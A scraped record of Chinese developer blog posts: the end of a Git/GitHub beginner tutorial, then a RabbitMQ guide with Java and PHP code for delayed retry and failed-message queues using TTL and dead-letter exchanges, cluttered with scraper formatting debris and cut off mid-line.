README.md\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,add ,README,.,md, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,步骤 4：创建一次提交,\n,目前为止，您已经创建了一个文件，并且已经通知了 Git，现在，是时候创建一次提交commit了。提交可以看作是一个里程碑。每当完成一些工作之时，您都可以创建一次提交，保存文件当前版本，这样一来，您可以返回之前的版本，并且查看那时候的文件内容。无论何时您修改了文件，都可以对文件创建一个上一次的不一样的新版本。,\n,创建一次提交，请输入：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit commit -m \"first commit\"\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,commit, ,-,m, ,\"first commit\", ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,就是这样！刚才您创建了包含一条注释为 “first commit” 的 Git 提交。每次提交，您都必须编辑注释信息；它不仅能协助您识别提交，而且能让您理解此时您对文件做了什么修改。这样到了明天，如果您在文件中添加新的代码，您可以写一句提交信息：“添加了新的代码”，然后当您一个月后回来查看提交记录或者 Git 日志（即提交列表），您还能知道当时的您在文件夹里做了什么。,\n,步骤 5: 将您的计算机与 GitHub 仓库相连接,\n,现在，是时候用如下命令将您的计算机连接到 GitHub 仓库了：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit remote add origin https://github.com/<your_username>/Demo.git\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,remote ,add ,origin ,https,:,//github.com/<your_username>/Demo.git, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,让我们一步步的分析这行命令。我们通知 Git 去添加一个叫做 ,origin, （起源）的，拥有地址为 ,https://github.com/<your_username>/Demo.git,（它也是您的仓库的 GitHub 地址） 的 ,remote, （远程仓库）。当您提交代码时，这允许您在 GitHub.com 和 Git 仓库交互时使用 ,origin, 这个名称而不是完整的 Git 地址。为什么叫做 ,origin,？当然，您可以叫点别的，只要您喜欢（惯例而已）。,\n,现在，我们已经将本地 Demo 仓库副本连接到了其在 GitHub.com 远程副本上。您的终端看起来如下：,\n,\n,此刻我们已经连接到远程仓库，可以推送我们的代码 到 GitHub.com（例如上传 ,README.md, 文件）。,\n,执行完毕后，您的终端会显示如下信息：,\n,\n,然后，如果您访问 ,https://github.com/<your_username>/Demo,，您会看到截图内显示的情况：,\n,\n,就是这么回事！您已经创建了您的第一个 GitHub 仓库，连接到了您的电脑，并且从你的计算机推送（或者称：上传）一个文件到 GitHub.com 名叫 Demo 的远程仓库上了。下一次，我将编写关于 Git 复制（从 GitHub 上下载文件到你的计算机上）、添加新文件、修改现存文件、推送（上传）文件到 GitHub。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 5 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114101/", "url_object_id": "b0fe29cc0c4c89c756cfc2daf1bfe5cb", "front_image_path": "full/b7572ca0b31306f69135c34a75fb5c67782dfb3a.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/a099bdc26462540c4ca8ac310b8a24b8.png"], "title": "RabbitMQ 发布订阅实战：实现延时重试队列", "create_time": "2018/06/15", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文作者： ,伯乐在线, - ,管宜尧, 。未经作者许可，禁止转载！,欢迎加入伯乐在线 ,专栏作者,。,RabbitMQ是一款使用Erlang开发的开源消息队列。本文假设读者对RabbitMQ是什么已经有了基本的了解，如果你还不知道它是什么以及可以用来做什么，建议先从官网的 ,RabbitMQ Tutorials, 入门教程开始学习。,\n,本文将会讲解如何使用RabbitMQ实现延时重试和失败消息队列，实现可靠的消息消费，消费失败后，自动延时将消息重新投递，当达到一定的重试次数后，将消息投递到失败消息队列，等待人工介入处理。在这里我会带领大家一步一步的实现一个带有失败重试功能的发布订阅组件，使用该组件后可以非常简单的实现消息的发布订阅，在进行业务开发的时候，业务开发人员可以将主要精力放在业务逻辑实现上，而不需要花费时间去理解RabbitMQ的一些复杂概念。,\n,概要,\n,我们将会实现如下功能,\n,\n,结合RabbitMQ的Topic模式和Work Queue模式实现生产方产生消息，消费方按需订阅，消息投递到消费方的队列之后，多个worker同时对消息进行消费,\n,结合RabbitMQ的 ,Message TTL, 和 ,Dead Letter Exchange, 实现消息的延时重试功能,\n,消息达到最大重试次数之后，将其投递到失败队列，等待人工介入处理bug后，重新将其加入队列消费,\n,\n,具体流程见下图,\n,\n,\n,生产者发布消息到主Exchange,\n,主Exchange根据Routing Key将消息分发到对应的消息队列,\n,多个消费者的worker进程同时对队列中的消息进行消费，因此它们之间采用“竞争”的方式来争取消息的消费,\n,消息消费后，不管成功失败，都要返回ACK消费确认消息给队列，避免消息消费确认机制导致重复投递，同时，如果消息处理成功，则结束流程，否则进入重试阶段,\n,如果重试次数小于设定的最大重试次数（3次），则将消息重新投递到Retry Exchange的重试队列,\n,重试队列不需要消费者直接订阅，它会等待消息的有效时间过期之后，重新将消息投递给Dead Letter Exchange，我们在这里将其设置为主Exchange，实现延时后重新投递消息，这样消费者就可以重新消费消息,\n,如果三次以上都是消费失败，则认为消息无法被处理，直接将消息投递给Failed Exchange的Failed Queue，这时候应用可以触发报警机制，以通知相关责任人处理,\n,等待人工介入处理（解决bug）之后，重新将消息投递到主Exchange，这样就可以重新消费了,\n,\n,技术实现,\n,Linus Torvalds, 曾经说过,\n,Talk is cheap. Show me the code,\n,我分别用Java和PHP实现了本文所讲述的方案，读者可以通过参考代码以及本文中的基本步骤来更好的理解,\n,\n,rabbitmq-pubsub-php,\n,rabbitmq-pubsub-java,\n,\n,创建Exchange,\n,为了实现消息的延时重试和失败存储，我们需要创建三个Exchange来处理消息。,\n,\n,master, 主Exchange，发布消息时发布到该Exchange,\n,master.retry, 重试Exchange，消息处理失败时（3次以内），将消息重新投递给该Exchange,\n,master.failed, 失败Exchange，超过三次重试失败后，消息投递到该Exchange,\n,\n,所有的Exchange声明(declare)必须使用以下参数,\n,\n,\n,\n,参数,\n,值,\n,说明,\n,\n,\n,\n,\n,exchange,\n,–,\n,Exchange名称,\n,\n,\n,type,\n,topic,\n,Exchange 类型,\n,\n,\n,passive,\n,false,\n,如果Exchange已经存在，则返回成功，不存在则创建,\n,\n,\n,durable,\n,true,\n,持久化存储Exchange，这里仅仅是Exchange本身持久化，消息和队列需要单独指定其持久化,\n,\n,\n,no-wait,\n,false,\n,该方法需要应答确认,\n,\n,\n,\n,Java代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n// 声明Exchange：主体，失败，重试\r\nchannel.exchangeDeclare(\"master\", \"topic\", true);\r\nchannel.exchangeDeclare(\"master.retry\", \"topic\", true);\r\nchannel.exchangeDeclare(\"master.failed\", \"topic\", true);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,// 声明Exchange：主体，失败，重试,channel,.,exchangeDeclare,(,\"master\",,, ,\"topic\",,, ,true,),;,channel,.,exchangeDeclare,(,\"master.retry\",,, ,\"topic\",,, ,true,),;,channel,.,exchangeDeclare,(,\"master.failed\",,, ,\"topic\",,, ,true,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,PHP代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n// 普通交换机\r\n$this->channel->exchange_declare('master', 'topic', false, true, false);\r\n// 重试交换机\r\n$this->channel->exchange_declare('master.retry', 'topic', false, true, false);\r\n// 失败交换机\r\n$this->channel->exchange_declare('master.failed', 'topic', false, true, false);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,// 普通交换机,$,this,->,channel,->,exchange_declare,(,'master',,, ,'topic',,, ,false,,, ,true,,, ,false,),;,// 重试交换机,$,this,->,channel,->,exchange_declare,(,'master.retry',,, ,'topic',,, ,false,,, ,true,,, ,false,),;,// 失败交换机,$,this,->,channel,->,exchange_declare,(,'master.failed',,, ,'topic',,, ,false,,, ,true,,, ,false,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在RabbitMQ的管理界面中，我们可以看到创建的三个Exchange,\n,\n,消息发布,\n,消息发布时，使用,basic_publish,方法，参数如下,\n,\n,\n,\n,参数,\n,值,\n,说明,\n,\n,\n,\n,\n,message,\n,–,\n,发布的消息对象,\n,\n,\n,exchange,\n,master,\n,消息发布到的Exchange,\n,\n,\n,routing-key,\n,–,\n,路由KEY，用于标识消息类型,\n,\n,\n,mandatory,\n,false,\n,是否强制路由，指定了该选项后，如果没有订阅该消息，则会返回路由不可达错误,\n,\n,\n,immediate,\n,false,\n,指定了当消息无法直接路由给消费者时如何处理,\n,\n,\n,\n,发布消息时，对于,message,对象，其内容建议使用,json编码后的字符串,，同时消息需要标识以下属性,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n'delivery_mode'=> 2 // 1为非持久化，2为持久化,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,'delivery_mode',=,>, ,2, ,// 1为非持久化，2为持久化,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,Java代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchannel.basicPublish(\r\n    \"master\", \r\n    routingKey, \r\n    MessageProperties.PERSISTENT_BASIC, // delivery_mode\r\n    message.getBytes()\r\n);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,channel,.,basicPublish,(,    ,\"master\",,, ,    ,routingKey,,, ,    ,MessageProperties,.,PERSISTENT_BASIC,,, ,// delivery_mode,    ,message,.,getBytes,(,),),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,PHP代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$msg = new AMQPMessage($message->serialize(), [\r\n    'delivery_mode' => AMQPMessage::DELIVERY_MODE_PERSISTENT,\r\n]);\r\n\r\n$this->channel->basic_publish($msg, 'master', $routingKey);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$,msg, ,=, ,new, ,AMQPMessage,(,$,message,->,serialize,(,),,, ,[,    ,'delivery_mode', ,=,>, ,AMQPMessage,::,DELIVERY_MODE_PERSISTENT,,,],),;, ,$,this,->,channel,->,basic_publish,(,$,msg,,, ,'master',,, ,$,routingKey,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,消息订阅,\n,消息订阅的实现相对复杂一些，需要完成队列的声明以及队列和Exchange的绑定。,\n,Declare Queue,\n,对于每一个订阅消息的服务，都必须创建一个该服务对应的队列，将该队列绑定到关注的路由规则，这样之后，消息生产者将消息投递给Exchange之后，就会按照路由规则将消息分发到对应的队列供消费者消费了。,\n,消费服务需要declare三个队列,\n,\n,[queue_name], 队列名称，格式符合 ,[服务名称]@订阅服务标识,\n,[queue_name]@retry, 重试队列,\n,[queue_name]@failed, 失败队列,\n,\n,订阅服务标识,是客户端自己对订阅的分类标识符，比如用户中心服务（服务名称ucenter），包含两个订阅：user和enterprise，这里两个订阅的队列名称就为 ,ucenter@user,和,ucenter@enterprise,，其对应的重试队列为 ,ucenter@user@retry,和,ucenter@enterprise@retry,。,\n,Declare队列时，参数规定规则如下,\n,\n,\n,\n,参数,\n,值,\n,说明,\n,\n,\n,\n,\n,queue,\n,–,\n,队列名称,\n,\n,\n,passive,\n,false,\n,队列不存在则创建，存在则直接成功,\n,\n,\n,durable,\n,true,\n,队列持久化,\n,\n,\n,exclusive,\n,false,\n,排他，指定该选项为true则队列只对当前连接有效，连接断开后自动删除,\n,\n,\n,no-wait,\n,false,\n,该方法需要应答确认,\n,\n,\n,auto-delete,\n,false,\n,当不再使用时，是否自动删除,\n,\n,\n,\n,对于,@retry,重试队列，需要指定额外参数,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n'x-dead-letter-exchange' => 'master'\r\n'x-message-ttl'          => 30 * 1000 // 重试时间设置为30s,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,'x-dead-letter-exchange', ,=,>, ,'master','x-message-ttl',          ,=,>, ,30, ,*, ,1000, ,// 重试时间设置为30s,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,这里的两个header字段的含义是，在队列中延迟30s后，将该消息重新投递到,x-dead-letter-exchange,对应的Exchange中,\n,Java代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n// 声明监听队列\r\nchannel.queueDeclare(\r\n    queueName, // 队列名称\r\n    true,      // durable\r\n    false,     // exclusive\r\n    false,     // autoDelete\r\n    null       // arguments\r\n);\r\nchannel.queueDeclare(queueName + \"@failed\", true, false, false, null);\r\n\r\nMap arguments = new HashMap();\r\narguments.put(\"x-dead-letter-exchange\", exchangeName());\r\narguments.put(\"x-message-ttl\", 30 * 1000);\r\nchannel.queueDeclare(queueName + \"@retry\", true, false, false, arguments);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,// 声明监听队列,channel,.,queueDeclare,(,    ,queueName,,, ,// 队列名称,    ,true,,,      ,// durable,    ,false,,,     ,// exclusive,    ,false,,,     ,// autoDelete,    ,null,       ,// arguments,),;,channel,.,queueDeclare,(,queueName, ,+, ,\"@failed\",,, ,true,,, ,false,,, ,false,,, ,null,),;, ,Map ,arguments, ,=, ,new, ,HashMap,(,),;,arguments,.,put,(,\"x-dead-letter-exchange\",,, ,exchangeName,(,),),;,arguments,.,put,(,\"x-message-ttl\",,, ,30, ,*, ,1000,),;,channel,.,queueDeclare,(,queueName, ,+, ,\"@retry\",,, ,true,,, ,false,,, ,false,,, ,arguments,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,PHP代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$this->channel->queue_declare($queueName, false, true, false, false, false);\r\n$this->channel->queue_declare($failedQueueName, false, true, false, false, false);\r\n$this->channel->queue_declare(\r\n    $retryQueueName, // 队列名称\r\n    false,           // passive\r\n    true,            // durable\r\n    false,           // exclusive\r\n    false,           // auto_delete\r\n    false,           // nowait\r\n    new AMQPTable([\r\n        'x-dead-letter-exchange' => 'master',\r\n        'x-message-ttl'          => 30 * 1000,\r\n    ])\r\n);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$,this,->,channel,->,queue_declare,(,$,queueName,,, ,false,,, ,true,,, ,false,,, ,false,,, ,false,),;,$,this,->,channel,->,queue_declare,(,$,failedQueueName,,, ,false,,, ,true,,, ,false,,, ,false,,, ,false,),;,$,this,->,channel,->,queue_declare,(,    ,$,retryQueueName,,, ,// 队列名称,    ,false,,,           ,// passive,    ,true,,,            ,// durable,    ,false,,,           ,// exclusive,    ,false,,,           ,// auto_delete,    ,false,,,           ,// nowait,    ,new, ,AMQPTable,(,[,        ,'x-dead-letter-exchange', ,=,>, ,'master',,,        ,'x-message-ttl',          ,=,>, ,30, ,*, ,1000,,,    ,],),),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在RabbitMQ的管理界面中，Queues部分可以看到我们创建的三个队列,\n,\n,查看队列的详细信息，我们可以看到 ,queueName@retry, 队列与其它两个队列的不同,\n,\n,Bind Exchange & Queue,\n,创建完队列之后，需要将队列与Exchange绑定（,bind,），不同队列需要绑定到之前创建的对应的Exchange上面,\n,\n,\n,\n,Queue,\n,Exchange,\n,\n,\n,\n,\n,[queue_name],\n,master,\n,\n,\n,[queue_name]@retry,\n,master.retry,\n,\n,\n,[queue_name]@failed,\n,master.failed,\n,\n,\n,\n,绑定时，需要提供订阅的路由KEY，该路由KEY与消息发布时的路由KEY对应，区别是这里可以使用通配符同时订阅多种类型的消息。,\n,\n,\n,\n,参数,\n,值,\n,说明,\n,\n,\n,\n,\n,queue,\n,–,\n,绑定的队列,\n,\n,\n,exchange,\n,–,\n,绑定的Exchange,\n,\n,\n,routing-key,\n,–,\n,订阅的消息路由规则,\n,\n,\n,no-wait,\n,false,\n,该方法需要应答确认,\n,\n,\n,\n,Java代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n// 绑定监听队列到Exchange\r\nchannel.queueBind(queueName, \"master\", routingKey);\r\nchannel.queueBind(queueName + \"@failed\", \"master.failed\", routingKey);\r\nchannel.queueBind(queueName + \"@retry\", \"master.retry\", routingKey);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,// 绑定监听队列到Exchange,channel,.,queueBind,(,queueName,,, ,\"master\",,, ,routingKey,),;,channel,.,queueBind,(,queueName, ,+, ,\"@failed\",,, ,\"master.failed\",,, ,routingKey,),;,channel,.,queueBind,(,queueName, ,+, ,\"@retry\",,, ,\"master.retry\",,, ,routingKey,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,PHP代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$this->channel->queue_bind($queueName, 'master', $routingKey);\r\n$this->channel->queue_bind($retryQueueName, 'master.retry', $routingKey);\r\n$this->channel->queue_bind($failedQueueName, 'master.failed', $routingKey);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$,this,->,channel,->,queue_bind,(,$,queueName,,, ,'master',,, ,$,routingKey,),;,$,this,->,channel,->,queue_bind,(,$,retryQueueName,,, ,'master.retry',,, ,$,routingKey,),;,$,this,->,channel,->,queue_bind,(,$,failedQueueName,,, ,'master.failed',,, ,$,routingKey,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在RabbitMQ的管理界面中，我们可以看到该队列与Exchange和routing-key的绑定关系,\n,\n,\n,\n,消息消费实现,\n,使用 ,basic_consume, 对消息进行消费的时候，需要注意下面参数,\n,\n,\n,\n,参数,\n,值,\n,说明,\n,\n,\n,\n,\n,queue,\n,–,\n,消费的队列名称,\n,\n,\n,consumer-tag,\n,–,\n,消费者标识，留空即可,\n,\n,\n,no_local,\n,false,\n,如果设置了该字段，服务器将不会发布消息到 发布它的客户端,\n,\n,\n,no_ack,\n,false,\n,需要消费确认应答,\n,\n,\n,exclusive,\n,false,\n,排他访问，设置后只允许当前消费者访问该队列,\n,\n,\n,nowait,\n,false,\n,该方法需要应答确认,\n,\n,\n,\n,消费端在消费消息时，需要从消息中获取消息被消费的次数，以此判断该消息处理失败时重试还是发送到失败队列。,\n,Java代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nprotected Long getRetryCount(AMQP.BasicProperties properties) {\r\n    Long retryCount = 0L;\r\n    try {\r\n        Map headers = properties.getHeaders();\r\n        if (headers != null) {\r\n            if (headers.containsKey(\"x-death\")) {\r\n                List\r\n\r\n\r\n\r\n<map>> deaths = (List\r\n\r\n\r\n\r\n<map>>) headers.get(\"x-death\");\r\n                if (deaths.size() > 0) {\r\n                    Map death = deaths.get(0);\r\n                    retryCount = (Long) death.get(\"count\");\r\n                }\r\n            }\r\n        }\r\n    } catch (Exception e) {}\r\n\r\n    return retryCount;\r\n}</map>\r\n \r\n\r\n\r\n</map>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,protected, ,Long, ,getRetryCount,(,AMQP,.,BasicProperties ,properties,), ,{,    ,Long, ,retryCount, ,=, ,0L,;,    ,try, ,{,        ,Map ,headers, ,=, ,properties,.,getHeaders,(,),;,        ,if, ,(,headers, ,!=, ,null,), ,{,            ,if, ,(,headers,.,containsKey,(,\"x-death\",),), ,{,                ,List, , , ,<,map,>>, ,deaths, ,=, ,(,List, , , ,<,map,>>,), ,headers,.,get,(,\"x-death\",),;,                ,if, ,(,deaths,.,size,(,), ,>, ,0,), ,{,                    ,Map ,death, ,=, ,deaths,.,get,(,0,),;,                    ,retryCount, ,=, ,(,Long,), ,death,.,get,(,\"count\",),;,                ,},            ,},        ,},    ,}, ,catch, ,(,Exception, ,e,), ,{,}, ,    ,return, ,retryCount,;,},<,/,map,>, , , ,<,/,map,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n, ,\n, ,\n, ,\n,PHP代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nprotected function getRetryCount(AMQPMessage $msg): int\r\n{\r\n    $retry = 0;\r\n    if ($msg->has('application_headers')) {\r\n        $headers = $msg->get('application_headers')->getNativeData();\r\n        if (isset($headers['x-death'][0]['count'])) {\r\n            $retry = $headers['x-death'][0]['count'];\r\n        }\r\n    }\r\n\r\n    return (int)$retry;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,protected, ,function, ,getRetryCount,(,AMQPMessage, ,$,msg,),:, ,int,{,    ,$,retry, ,=, ,0,;,    ,if, ,(,$,msg,->,has,(,'application_headers',),), ,{,        ,$,headers, ,=, ,$,msg,->,get,(,'application_headers',),->,getNativeData,(,),;,        ,if, ,(,isset,(,$,headers,[,'x-death',],[,0,],[,'count',],),), ,{,            ,$,retry, ,=, ,$,headers,[,'x-death',],[,0,],[,'count',],;,        ,},    ,}, ,    ,return, ,(,int,),$,retry,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,消息消费完成后，需要发送消费确认消息给服务端，使用,basic_ack,方法,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nack(delivery-tag=消息的delivery-tag标识),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,ack,(,delivery,-,tag,=,消息的,delivery,-,tag,标识,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,Java代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n// 消息消费处理\r\nConsumer consumer = new DefaultConsumer(channel) {\r\n    @ Override\r\n    public void handleDelivery(String consumerTag, Envelope envelope,\r\n                               AMQP.BasicProperties properties, byte[] body) throws IOException {\r\n        ...\r\n        // 注意，由于使用了basicConsume的autoAck特性，因此这里就不需要手动执行\r\n        // channel.basicAck(envelope.getDeliveryTag(), false);\r\n    }\r\n};\r\n// 执行消息消费处理\r\nchannel.basicConsume(\r\n    queueName, \r\n    true, // autoAck\r\n    consumer\r\n);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,// 消息消费处理,Consumer ,consumer, ,=, ,new, ,DefaultConsumer,(,channel,), ,{,    ,@, ,Override,    ,public, ,void, ,handleDelivery,(,String, ,consumerTag,,, ,Envelope ,envelope,,,                               ,AMQP,.,BasicProperties ,properties,,, ,byte,[,], ,body,), ,throws, ,IOException, ,{,        ,.,.,.,        ,// 注意，由于使用了basicConsume的autoAck特性，因此这里就不需要手动执行,        ,// channel.basicAck(envelope.getDeliveryTag(), false);,    ,},},;,// 执行消息消费处理,channel,.,basicConsume,(,    ,queueName,,, ,    ,true,,, ,// autoAck,    ,consumer,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,PHP代码,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$this->channel->basic_consume(\r\n    $queueName,\r\n    '',    // customer_tag\r\n    false, // no_local\r\n    false, // no_ack\r\n    false, // exclusive\r\n    false, // nowait\r\n    function (AMQPMessage $msg) use ($queueName, $routingKey, $callback) {\r\n        ...\r\n        $msg->delivery_info['channel']->basic_ack($msg->delivery_info['delivery_tag']);\r\n    }\r\n);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$,this,->,channel,->,basic_consume,(,    ,$,queueName,,,    ,'',,,    ,// customer_tag,    ,false,,, ,// no_local,    ,false,,, ,// no_ack,    ,false,,, ,// exclusive,    ,false,,, ,// nowait,    ,function, ,(,AMQPMessage, ,$,msg,), ,use, ,(,$,queueName,,, ,$,routingKey,,, ,$,callback,), ,{,        ,.,.,.,        ,$,msg,->,delivery_info,[,'channel',],->,basic_ack,(,$,msg,->,delivery_info,[,'delivery_tag',],),;,    ,},),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果消息处理中出现异常，应该将该消息重新投递到重试Exchange，等待下次重试,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nbasic_publish(msg, 'master.retry', routing-key)\r\nack(delivery-tag) // 不要忘记了应答消费成功消息,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,basic_publish,(,msg,,, ,'master.retry',,, ,routing,-,key,),ack,(,delivery,-,tag,), ,// 不要忘记了应答消费成功消息,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果判断重试次数大于3次，仍然处理失败，则应该讲消息投递到失败Exchange，等待人工处理,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nbasic_publish(msg, 'master.failed', routing-key)\r\nack(delivery-tag) // 